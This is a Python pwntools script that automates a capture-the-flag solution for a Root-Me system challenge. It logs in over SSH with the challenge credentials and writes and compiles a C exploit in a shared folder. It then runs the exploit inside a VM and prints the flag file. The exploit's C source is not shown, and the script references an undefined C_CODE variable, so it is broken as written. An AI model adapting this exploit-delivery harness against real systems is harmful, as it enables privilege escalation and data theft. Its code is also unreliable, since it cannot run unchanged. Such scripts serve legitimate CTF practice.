#!/usr/bin/env python3

from pwn import *
import time
import re
import sys

HOST = 'challenge03.root-me.org'
PORT = 2223
USER = 'app-systeme-ch1'
PASS = 'app-systeme-ch1'

C_CODE_PATH = "./exploit.c" 


def send_and_print(shell, cmd, timeout=10):
    if isinstance(cmd, bytes):
        display = cmd.decode(errors='replace')
    else:
        display = cmd

    print(f"[HOST] $ {display}")

    shell.sendline(cmd)

    output = b''

    while True:
        try:
            data = shell.recvuntil(b'$ ', timeout=timeout)
            output += data
            break
        except TimeoutError:
            continue
        except EOFError:
            break

    if output:
        print(output.decode(errors='replace').strip())

    return output


def main():
    print(f"[*] Connecting to {HOST}:{PORT}...")

    conn = ssh(
        host=HOST,
        port=PORT,
        user=USER,
        password=PASS,
        timeout=10
    )

    if not conn.connected():
        print("[-] SSH connection failed")
        sys.exit(1)

    print("[+] SSH connected")

    print("[*] Launching ./run...")

    vm = conn.run('./run')

    share_path = None
    deadline = time.time() + 20

    while time.time() < deadline:
        try:
            line = vm.recvline(timeout=5)
        except EOFError:
            break

        if not line:
            continue

        print("[VM] " + line.decode(errors='replace').rstrip())

        if b"A share will be available: host:" in line:
            match = re.search(rb'host:([^\s]+)', line)

            if match:
                share_path = match.group(1).decode()
                print(f"[+] Share path: {share_path}")
                break

    if not share_path:
        print("[-] Failed to determine share path")
        vm.close()
        conn.close()
        sys.exit(1)

    print("[*] Opening host shell...")

    host = conn.shell()

    try:
        host.recvuntil(b'$ ', timeout=10)
    except Exception:
        print("[-] Failed to get host shell")
        vm.close()
        conn.close()
        sys.exit(1)

    print("[+] Host shell ready")

    send_and_print(
        host,
        f"cd {share_path}".encode()
    )

    print("[*] Writing exploit.c...")

    host.sendline(b"cat > exploit.c << 'EOF'")
    host.send(C_CODE.encode())

    if not C_CODE.endswith('\n'):
        host.send(b'\n')

    host.sendline(b"EOF")

    try:
        host.recvuntil(b'$ ', timeout=10)
    except Exception:
        print("[-] Failed to create exploit.c")
        host.close()
        vm.close()
        conn.close()
        sys.exit(1)

    print("[+] exploit.c written")

    print("[*] Compiling...")

    compile_output = send_and_print(
        host,
        b"gcc -m32 -static -o exploit exploit.c",
        timeout=30
    )

    if b"error:" in compile_output.lower():
        print("[-] Compilation failed")
        host.close()
        vm.close()
        conn.close()
        sys.exit(1)

    send_and_print(host, b"file exploit")
    send_and_print(host, b"ls -lh exploit")
    send_and_print(host, b"chmod 777 exploit")

    print("[+] Compilation complete")

    host.close()

    print("[*] Waiting for VM shell...")

    try:
        vm.recvuntil(b'$ ', timeout=20)
    except Exception:
        print("[-] VM shell did not appear")
        vm.close()
        conn.close()
        sys.exit(1)

    print("[+] VM shell ready")

    print("[*] Checking shared exploit...")

    vm.sendline(b"ls -lh /mnt/share/exploit")

    try:
        ls_output = vm.recvuntil(b'$ ', timeout=5)
    except Exception:
        ls_output = b''

    print(ls_output.decode(errors='replace').strip())

    if (
        b"No such file" in ls_output or
        b"cannot access" in ls_output
    ):
        print("[-] /mnt/share/exploit not found")
        vm.close()
        conn.close()
        sys.exit(1)

    print("[*] Executing exploit...")

    vm.sendline(b"/mnt/share/exploit 2>&1")

    output = b''
    deadline = time.time() + 20

    while time.time() < deadline:
        try:
            data = vm.recv(timeout=1)
        except EOFError:
            break
        except TimeoutError:
            continue

        if not data:
            continue

        output += data

        if b'\n$ ' in output or b'\n# ' in output:
            break

    print()
    print("============== EXPLOIT OUTPUT ==============")
    print(output.decode(errors='replace'))
    print("=============================================")

    if b'\n$ ' in output or b'\n# ' in output:
        print("[+] Exploit returned to guest shell")

        vm.sendline(b"id")

        try:
            identity = vm.recvuntil(b'$ ', timeout=5)
            print(identity.decode(errors='replace').strip())
        except Exception:
            pass

        vm.sendline(b"cat /passwd/passwd")

        try:
            flag_output = vm.recvuntil(b'$ ', timeout=5)

            print()
            print("================ FLAG ================")
            print(flag_output.decode(errors='replace').strip())
            print("======================================")
        except Exception:
            pass
    else:
        print("[-] Exploit did not return to guest shell")
        print("[-] VM may have crashed or panicked")

    try:
        vm.close()
    except Exception:
        pass

    try:
        conn.close()
    except Exception:
        pass


if __name__ == '__main__':
    main()

